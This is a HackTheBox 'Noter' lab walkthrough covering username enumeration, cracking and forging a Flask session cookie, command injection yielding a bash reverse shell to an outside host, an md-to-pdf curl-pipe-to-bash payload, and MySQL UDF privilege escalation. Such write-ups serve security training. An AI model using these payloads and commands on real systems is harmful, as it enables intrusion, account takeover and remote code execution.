# HackTheBox - Noter

## NMAP

```bash
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
|_http-title: Noter
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## PORT 21 (FTP)

Tried anonymous login on ftp which failed, so moving on to port 5000

<img src="https://i.imgur.com/zFew4bb.png"/>

## PORT 5000 (HTTP)

<img src="https://i.imgur.com/0dS197h.png"/>

On this page we can see an option to see notes but this required a authorized user, I tried to use default admin password `admin:admin` which didn't worked. Also tried doing a basic sqli `admin' or 1=1 -- ` which failed too

<img src="https://i.imgur.com/1fkEZKg.png"/>

We do have an option to register an account so let's do that

<img src="https://i.imgur.com/WBUs27x.png"/>

After logging in we can add notes and also there's an option for upgrading to VIP

<img src="https://i.imgur.com/AL3FPFw.png"/>

But this option wasn't available

<img src="https://i.imgur.com/FSWvvjt.png"/>

So moving on to adding notes, I tried testing for xss which failed

<img src="https://i.imgur.com/xPGeiIH.png"/>

<img src="https://i.imgur.com/go3mnue.png"/>

Checking the session cookie, it was a flask session as it can be decoded using `flask-unsign` which tells that it's a flask application

<img src="https://i.imgur.com/aK4U3pt.png"/>

<img src="https://i.imgur.com/xme7xJg.png"/>

Maybe there's SSTI in notes, we can check that too because most of the flask apps are vulnerable to SSTI

<img src="https://i.imgur.com/DkJNRMo.png"/>

<img src="https://i.imgur.com/lqISWJB.png"/>

This didn't worked as well, so I went with fuzzing for files and directories using `dirsearch`

<img src="https://i.imgur.com/m5XbWZH.png"/>

## Foothold

There wasn't really interesting, looking back at the flask session maybe we can modify it to get a user's session but for that there are two things we need a valid username which should have admin privileges or should get us somewhere and a flask secret with which we can forge flask session

We can fuzz for usernames and to do that we need to do some filtering with the responses

<img src="https://i.imgur.com/mbJze0h.png"/>

For the existing username we get an error message "Invalid login"

<img src="https://i.imgur.com/Vgc4Y3W.png"/>

And for a user which doesn't exist we get "Invalid credentials" so with the help of error messages we can do user enumeration

<img src="https://i.imgur.com/OWVJUzk.png"/>

Let's first identifiy POST parameters

<img src="https://i.imgur.com/yAlbdN1.png"/>

I added `ARZ` which is a valid user and `admin` which doesn't exist and looking at the response of characters we can try to filter for characters below `2030` which might give us a username

```bash
wfuzz -c -w /opt/SecLists/Usernames/xato-net-10-million-usernames-dup.txt  -u 'http://10.10.11.16
0:5000/login' -d 'username=FUZZ&password=1' --hh 2029,2030,2031,2032,2033,2034,2035,2036
```
<img src="https://i.imgur.com/n93vdhk.png"/>

So it started to show me responses with less characters but still I wasn't sure of which ones could be a username so this method isn't effective even tho we can see a username `blue` with the same exact characters so this might be the username we are looking but we can do this effectively with a tool called `patator`

https://github.com/lanjelot/patator

```bash
python3 patator.py http_fuzz 'url=http://10.10.11.160:5000/login' method=POST body='username=FILE0&password=a' 0=/opt/SecLists/Usernames/xato-net-10-million-usernames-dup.txt -x ignore:fgrep='Invalid credentials'
```
The syntax is a little harder but it's an awesome tool to fuzz with error messages

<img src="https://i.imgur.com/PhIRORP.png"/>

Which gives the same user `blue` and if check on the login page to see if this user exists

<img src="https://i.imgur.com/kFq7lnJ.png"/>

We get the message "Invalid login", now we just need the secret in order to modify the flask session

<img src="https://i.imgur.com/XrCMlAS.png"/>

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask

Visitng hacktricks, we can brute force secret with flask-unsign 

<img src="https://i.imgur.com/6NQXQkQ.png"/>

Using `rockyou.txt` to brute force secret didn't work so I had to install the wordlist for flask secret

<img src="https://i.imgur.com/UmtSRc9.png"/>

```bash
flask-unsign --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiQVJaIn0.Ynkvhw.C69zkNUyfYjmYN0e08l6EmWAh1U'
```
<img src="https://i.imgur.com/UpMNb1j.png"/>

And we got the secret which is `secret123`, now we need to sign in having the username `blue`

```bash
flask-unsign --sign --cookie "{'logged_in': True, 'username': 'blue'}" --secret 'secret123'
```

<img src="https://i.imgur.com/nzx9Uzv.png"/>

After replacing the flask session we'll be able to login as blue

<img src="https://i.imgur.com/VwXeXKE.png"/>

And in notes we'll be able to a password for ftp user  `blue : blue@Noter!`

<img src="https://i.imgur.com/XGc8P0J.png"/>

<img src="https://i.imgur.com/aZFqysk.png"/>

Reading the pdf file, we'll get another password `username@site_name!` so this must be for the `ftp_admin` which would be `ftp_admin@Noter!`

<img src="https://i.imgur.com/wLo9uDq.png"/>

Downloading these backup archives, we get two versions of the source code, the one from the backup `1638395546` is having the source code for exporting notes

## Un-Intended Method

<img src="https://i.imgur.com/tfRqfBd.png"/>

And it's running a command to run a node js module passing the contents of makrdown file to convert it to pdf which is then executing a shell command with `subprocess.run` which is vulnerable to command injection

I created a markdown file having a bash reverse shell, now let's try importing it

<img src="https://i.imgur.com/0z84My2.png"/>

<img src="https://i.imgur.com/pAmvOvb.png"/>

After exporting the makrdown file we'll get this error but at our netcat listener we'll get a connection but it will just close after connecting

<img src="https://i.imgur.com/hOdmCqL.png"/>

To escapae the single quote from `$'{r.text.strip()}'` we need to use `'`  before our reverse shell and use either pipe `|` or semicolon `;` to execute the reverse shell command  at the end we'll specify `#`

```bash
' ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.51/2222 0>&1' #

```

<img src="https://i.imgur.com/rnLfJPR.png"/>

Stabilizing the shell with python3

<img src="https://i.imgur.com/vn17TBV.png"/>

I didn't find any thing in user's directory or having  seeing anything with `sudo -l` so transferred `pspy` to monitor background processes 

<img src="https://i.imgur.com/FSaMHiR.png"/>

We can also see how that single quote escape worked

<img src="https://i.imgur.com/A0u3VnJ.png"/>

## Intended Method
From the node command being executed, it's a module called `md-to-pdf`

<img src="https://i.imgur.com/SNsZ3yk.png"/>

<img src="https://i.imgur.com/0JQGcje.png"/>

This was vulnerable to rce

<img src="https://i.imgur.com/k1d7WMB.png"/>

https://github.com/simonhaenisch/md-to-pdf/issues/99

```
---js\n((require("child_process")).execSync("curl 10.10.16.51:3333/shell.sh | bash"))\n---RCE

```

This payload will download our bash reverse shell and execute by piping it to bash

<img src="https://i.imgur.com/t3ukvDv.png"/>

From the backup of `1635803546`  archive, we previously found credentials for mysql so let's test if these work
<img src="https://i.imgur.com/jyGvVPY.png"/>

<img src="https://i.imgur.com/ivAuWFD.png"/>

## Privilege Escalation

Here we can do something which is called `Privilege Escalation with MySQL User Defined Functions`

https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf

https://www.exploit-db.com/exploits/1518

First we need to compile the source code

<img src="https://i.imgur.com/MF0hq79.png"/>

Now to create a shared library

<img src="https://i.imgur.com/Q4NepGc.png"/>

After this we need to locate where the plugins are stroed and create a table in `mysql` database which will have an entry for the exploit which will help us in loading it in mysql plugins, create a user defined function which will run system commands using that shared library

<img src="https://i.imgur.com/eEQs1xN.png"/>

Plugins directory is `/usr/lib/x86_64-linux-gnu/mariadb19/plugin/` 

Switching to mysql database

<img src="https://i.imgur.com/eSiYUbL.png"/>

Creating a table named `foo` and inserting the shared library

<img src="https://i.imgur.com/RiGiUkx.png"/>

<img src="https://i.imgur.com/E6zKQ06.png"/>

From the table, loading the plugin

<img src="https://i.imgur.com/ShP3eBi.png"/>

Creating the function `do_system`

<img src="https://i.imgur.com/R04lzEg.png"/>

And now just using the function to get a reverse shell

<img src="https://i.imgur.com/QVUcVTm.png"/>

## References
- https://github.com/lanjelot/patator
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask
- https://pypi.org/project/flask-unsign-wordlist/
- https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf
- https://www.exploit-db.com/exploits/50236


